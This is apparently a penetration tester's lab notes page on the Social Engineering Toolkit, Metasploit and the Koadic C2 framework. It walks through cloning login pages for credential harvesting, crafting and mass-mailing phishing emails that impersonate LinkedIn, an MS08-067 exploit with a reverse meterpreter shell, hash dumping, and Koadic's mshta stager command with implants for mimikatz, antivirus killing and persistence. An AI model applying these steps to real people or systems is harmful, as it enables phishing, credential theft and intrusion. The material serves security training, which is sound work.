---
layout: page
title: "Exploitation / Post-Exploitation"
permalink: /expl/
---

# Exploitation / Post-Exploitation

[Home](README.md)

## Social Engineering Toolkit

<details>
<summary style="display: block; font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em; margin-left: 0; margin-right: 0;">Click to expand</summary>

Designed to attack the human element.

### Install if necessary

    git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
    cd setoolkit
    pip3 install -r requirements.txt
    python setup.py

### Credential Harvester

Credential Harvester clones a website and starts a web server to host this
phishing site. A target visits the cloned websites and attempts
to log in using legitimate credentials.

The target's credentials are sent back to SET in plain text.

Run `setoolkit` to open SET

Choose option 2, 'Website attack vectors'

Choose option 3, 'Credential Harvester Attack Method'

Choose a template or provide a custom import url (Note: The web page must use the POST method and have username and password fields)

SET starts the web server and hosts the clone site, waiting for a target to put in credentials

[PentestLab Reference](https://pentestlab.blog/2012/04/17/qrcode-attack-vector/)

### QR Code Creator

QR Code Creator creates a qr code that can be used to redirect targets to a cloned website for credential harvesting

Run `setoolkit` to open SET

Choose option 9, 'QRCode Generator Attack Vector'

Provide the url you would like to use for the QR Code redirect

SET will save the QR Code as a png file and provide the path in the console

[PentestLab Reference](https://pentestlab.blog/2012/04/17/qrcode-attack-vector/)

### Mass Mailer Exploit: Lab Demo

#### Information Gathering for Spear Phishing Attack

You could gather targets by using theHarvester

    theHarvester -d <targetdomain> -b google

If the company uses full names in their email addresses, it would be easy to pull public social media information via tools like userrecon (Links to an external site.)  or Social Mapper (Links to an external site.)

For this demo I didn't target any real email addresses or use a public email service

#### Create Phishing Email Template

Once you have a social media platform chosen, use Metasploit to clone the login page and host on your kali vm.

Use examples of real social media emails to create the email body template in html, with the main call to action pointing to your listeners.

Save a copy of a legitimate email

Open the .eml or .msg file in a rich text editor like VS Code, Notepad++ or Sublime

Pull the html out of the message and tweak as needed. Replace image references if necessary and replace the links with those of your cloned social media login page.

Copy the modified html body and save it.

Set Up Email Server / Target Mailbox

#### Create new user

``useradd -m -s /bin/bash <username>``
``passwd <username>``
``<enter and confirm password>``

#### Install a mail server

``apt -y install postfix``

Choose Local only

Specify sender domain (something like linkedininvitations.com)

``sudo nano /etc/postfix/virtual``
``@localhost <your-user>``
``@localhost.com <your-user>``
``sudo nano /etc/postfix/main.cf``
``virtual_alias_maps = hash:/etc/postfix/virtual``
``sudo postmap /etc/postfix/virtual``
`sudo systemctl restart postfix``

#### Install a mail client like thunderbird

``Apt -y install thunderbird``

Launch thunderbird from the application menu

Cancel the initial account setup screen

In the accounts / folders area on the left, right click local folders and choose settings

For outgoing server (SMTP), click Add

Description = localhost

Server Name = localhost

Port = 25

Connection security = none

Authentication method = No authentication

In the bottom of the account settings box, choose Account actions > Add other account

Choose Unix Mailspool

Enter your name and the email address for the local account you created

Justin

justin@localhost

Click next to select the outgoing server you created

Enter a name for the account

Click finish

You should now be able to send receive email within thunderbird for the new local account.

Send yourself a test email to verify. You will see an error related to a mailspool until you send an email to yourself one time. This is normal.

#### Execute Mass Mailing Campaign

Open SET by typing `setoolkit` in a bash shell

Choose 1 for Social-Engineering Attacks

Choose 5 for Mass Mailer Attack

If you want to just target one email address at a time to conduct a spear phishing attack, choose 1, otherwise to conduct a mass mailed phishing attack, choose 2

If you choose the mass email, you’ll need to specify the full path to a text file containing all the target email addresses, otherwise enter the target email address

Choose to use your own server when prompted

Enter a believable from address (donotreply@LinkedInInvitations.com)

Enter a from name (LinkedIn)

Press enter to set a blank username for the email relay

Press enter to set a blank password for the email relay

Enter localhost for the smtp server address

Enter 25 for the smtp port

Enter yes or no for high priority flag

Enter yes or no to attach a file

Enter yes or no to attach and inline file

Enter the Email subject

Choose h for html

Copy and paste the html you modified in step 4

At the end, type END and press enter

Your phishing email will now be sent to the target address(es) you specified

You can open your thunderbird client and click Get Messages to see your phishing emails.

[SET GitHub](https://github.com/trustedsec/social-engineer-toolkit)

[SET Tutorial](https://github.com/trustedsec/social-engineer-toolkit/raw/master/readme/User_Manual.pdf)

</details>

## Metasploit

<details>
<summary style="display: block; font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em; margin-left: 0; margin-right: 0;">Click to expand</summary>

Tool that aggregates exploits and allows pen testers to easily try multple exploits against a target or group of targets.

### Terms

* Exploit: Module that uses a payload. Auxillary module has no payload
* Payload: Code that runs remotely. Can use encoder and nops to hide code from AB
* Modules: /usr/share/metasploit-framework/modules/ . Written in Ruby

### Setup

From Kali:

`apt update`
`service postgresql start`
`msfdb init`

### Workspaces

    workspace -a <newname>
    workspace -d <deletename>
    workspace name
    workspace -h

### Basic Usage

    show exploits
    show auxiliary
    show options
    show targets

### MS08-067

    search ms08_067_netapi
    Use exploit/windows/smb/ms08_067_netapi
    Set payload windows/meterpreter/reverse_tcp
    Show targets
    Set target 2
    Set RHOST [target machine ip]
    Set LHOST [Kali machine ip]
    Set LPORT [port]
    Show options
    Exploit
    shell

### WMap

    use wmap
Loads the msfcrawler/wmap module

    info
Shows options available to set for this module

    set RHOSTS 192.168.8.133
Sets the target host ip. Could be ip, ip range

    run
Runs the vulnerability scan against the RHOSTS ip or ip range

    vulns
Shows discovered vulnerabilities

Alternatively, you could run wmap commands directly using the wmap plugin. This allows us to target a specific set of URLs instead.

    load wmap
Loads the wmap plugin

    wmap_sites -a http://192.168.8.133 (Links to an external site.)
Adds a target host root

    wmap_sites -l
Shows host root list

    wmap_targets -t http://192.168.8.133/vicnum/ (Links to an external site.)
Adds target web apps to job scope list

    wmap_run -t
Shows active modules

    wmap_run -e
Runs the active modules against the targets list

    vulns
Shows discovered vulnerabilities

### AutoPwn2

    use auxiliary/server/browser_autopwn2
    show options

![Autopwn](/media/autopwn2_1.png)

This loads the plugin and shows us what we can set for the plugin.

    Set the URIPATH and SRVPORT to something inconspicuous
    set URIPATH Home
    set SRVPORT 80

![Autopwn](/media/autopwn2_2.png)

The URIPATH will be the page name in the URL. The word Home isn’t as suspect as the random default. SRVPORT just defines the port which the web server will bind to.

To show available commands. Take note of the auxiliary commands.

    ?

![Autopwn](/media/autopwn2_3.png)

Run the plugin module with common exploit modules

    run

![Autopwn](/media/autopwn2_4.png)

This may take a couple minutes. Take note of the BrowserAutoPwn URL at the bottom. This is the URL our targets need to browse to.

On the target VM, open internet explorer and go to the BrowserAutoPwn URL

![Autopwn](/media/autopwn2_5.png)

One the attacker vm, you’ll notice Metasploit attempting exploits against the browser and a meterpreter session will be created.

![Autopwn](/media/autopwn2_6.png)

### Meterpreter

<details>

To see the active session list

    sessions -l

To enter an interactive session

    sessions -i <session id>

![](/media/meterpreter_1.png)

You can run ``?`` to get a listing of available commands at this meterpreter shell
There are many commands available, but not all will work for every target.
A few examples:
You can grab a screenshot of the active user session

    screenshot

![](/media/meterpreter_2.png)

Pull a hashdump of the SAM database

    hashdump

![](/media/meterpreter_3.png)

Make a registry change

    reg [command] [options]

![](/media/meterpreter_4.png)

This creates a new Reg key named ‘Test’ at HKLM\Software\

Open an interactive command prompt

    shell

![](/media/meterpreter_5.png)

In this screenshot, I was able to show the hostname of the target and enumerate local users from a remote interactive command prompt. You could of course create a backdoor user from here if you chose.

Exit meterpreter and Metasploit to clean up jobs and stop web servers

![](/media/meterpreter_6.png)

</details>

### References

[Rapid7 MSFCrawler](https://www.rapid7.com/db/modules/auxiliary/crawler/msfcrawler)

[Offensive Security WMap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/)

[Null Byte WMap](https://null-byte.wonderhowto.com/how-to/use-metasploits-wmap-module-scan-web-applications-for-common-vulnerabilities-0187572/)

[Offensive Security Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)

[Infosec Institute Vulnerability Scanning with Metasploit](https://resources.infosecinstitute.com/vulnerability-scanning-metasploit-part-ii/#gref)

[About the Metasploit Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

</details>

## Koadic

<details>
<summary style="display: block; font-size: 1.5em; margin-top: 0.83em; margin-bottom: 0.83em; margin-left: 0; margin-right: 0;">Click to expand</summary>

[Koadic Github](https://github.com/zerosum0x0/koadic)

Koadic is a post-exploitation tool used to harvest information, deliver malicious payloads, and pivot/propagate exploitation. It is a command and control utility that listens as a web server on a specified port for targets to register. Targets are called zombies, and the web server is called a stager. The red team member uses koadics implant modules to create jobs for zombies. The zombies collect and execute these jobs, returning data or confirming successful configuration changes.

### Install

Koadic is not included with Kali. You must install pre-requisites and clone the repository to get koadic.

In Kali, open a terminal.
Update the apt repository list

    sudo apt -y update

Install Python 3.7 and PIP 3:

    sudo apt -y install python3.7 python3-pip

Clone the repository using git:

    git clone [Koadic Github](https://github.com/zerosum0x0/koadic)

Install koadic requirements from the requirements list:

    cd koadic
    sudo pip3 install -r requirements.txt

Start Koadic:

    ./koadic

### Configure Stager and Register Zombie Windows 10 Machine

Show and Set stager parameters:

    info
    set SRVPORT <desired port number>
    set ENDPOINT test (or desired endpoint name)

Run the stager:

    run

Make note of the second returned line. This is what the target must run to register as a zombie of this stager.

On a Windows 10 machine, open an admin powershell console window

Run the mshta command with our new stager url (the one returned when we started the stager)

    mshta http://<ipaddress>:<port>/<endpointname>

On Kali, show zombies list:

    zombies

### Use Implant Modules

Implants are python-based modules used to create jobs on the stager for zombies to run. You can create custom implants and add to your modules directory for extensibility.

To use an implant:

    use <implant path>

Set parameters if necessary:

    info
    set <parameter name> <parameter value>

Run the implant:

    run

#### Notable Gather Modules

* Implant/gather/clipboard – collects current clipboard value for logged in user
* Implant/gather/enum_domain_info – collect verbose domain information
* Implant/gather/hashdump_sam – pulls account names with password hashes
* Implant/gather/loot_finder – looks for interesting/notable files

#### Notable Inject Modules

* Implant/inject/mimikatz_dotnet2js – Runs mimikatz on the zombie to pull password hashes

    creds -a – shows a verbose output of returned mimikatz information

#### Notable Manage Modules

* Implant/manage/exec_cmd – Runs given command on the zombie as a local command
* Implant/manage/killav – Kills some antivirus clients

#### Notable Persist Modules

* Implant/persist/add_user – Adds a user with given username, password. Can also add the user as local administrator
* Implant/persist/schtasks – Create scheduled task on zombie. Can be used to run the mshta command every time the target starts
* Implant/persist/registry – Create/modify registry entries on zombie

#### Other Notable Modules

* Implant/phish/password_box – Shows a dialog box prompting the user to enter a value. Default requests they enter a password
* Implant/pivot/exec_psexec – Runs remote command from the zombie against another device. Can be used to remote register other targets as zombies
* Implant/scan/tcp – Runs nmap-like scan to enumerate listening ports on a given target
* Implant/util/download_file – Downloads file from zombie to given local directory
* Implant/util/upload_file – Uploads file to zombie

This tool uses Jscript and VBScript to run these modules, so powershell is not a requirement for Koadic like other C2 tools. You can create your own python scripts to run as implants if there is something this tool is lacking. Koadic is a powerful post-exploitation utility and makes an excellent addition to any pen testing framework.

</details>
